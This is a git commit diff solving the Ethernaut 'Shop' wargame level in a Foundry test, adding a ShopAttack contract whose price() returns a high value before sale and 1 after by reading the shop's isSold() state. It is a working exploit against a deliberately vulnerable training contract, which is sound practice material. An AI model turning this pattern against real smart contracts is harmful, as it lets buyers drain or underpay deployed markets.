fa789ffd1347d8aff4d7edabe967cfc6d7a7d1f1
islu <38793955+islu@users.noreply.github.com>
2024-04-22 08:55:05 +0800

    solve challenge (21. Shop)

--- test/Shop.t.sol
+++ test/Shop.t.sol
@@ -5,19 +5,51 @@ import {EthernautTest} from "./utils/EthernautTest.sol";
 import {ShopFactory} from "../src/factories/ShopFactory.sol";
 import {Shop} from "../src/levels/Shop.sol";
 
+import "forge-std/console.sol";
+
 contract ShopTest is EthernautTest {
     function setUp() public override {
-	super.setUp();
-	ShopFactory factory = new ShopFactory();
-	ethernaut.registerLevel(factory);
-	levelAddress = ethernaut.createLevelInstance(factory);
+        super.setUp();
+        ShopFactory factory = new ShopFactory();
+        ethernaut.registerLevel(factory);
+        levelAddress = ethernaut.createLevelInstance(factory);
     }
 
     function testSolveShop() public {
-        Shop instance = Shop(payable(levelAddress));
+        Shop shop = Shop(payable(levelAddress));
 
-	// insert your code here!
-	
-	assert(ethernaut.submitLevelInstance(payable(levelAddress)));
+        // [START]
+
+        // 1. Deploy attacker contract
+        ShopAttack attacker = new ShopAttack(address(shop));
+
+        // 2. Call attack
+        attacker.attack();
+
+        // [END]
+
+        assert(ethernaut.submitLevelInstance(payable(levelAddress)));
+    }
+}
+
+// Attack contract
+contract ShopAttack {
+    address shopAddr;
+
+    constructor(address _shop) {
+        shopAddr = _shop;
+    }
+
+    function price() external view returns (uint _price) {
+        (, bytes memory returnData) = shopAddr.staticcall(
+            abi.encodeWithSignature("isSold()")
+        );
+        bool isSold = abi.decode(returnData, (bool));
+        _price = isSold ? 1 : 100;
+    }
+
+    function attack() external {
+        (bool success, ) = shopAddr.call(abi.encodeWithSignature("buy()"));
+        require(success);
     }
 }
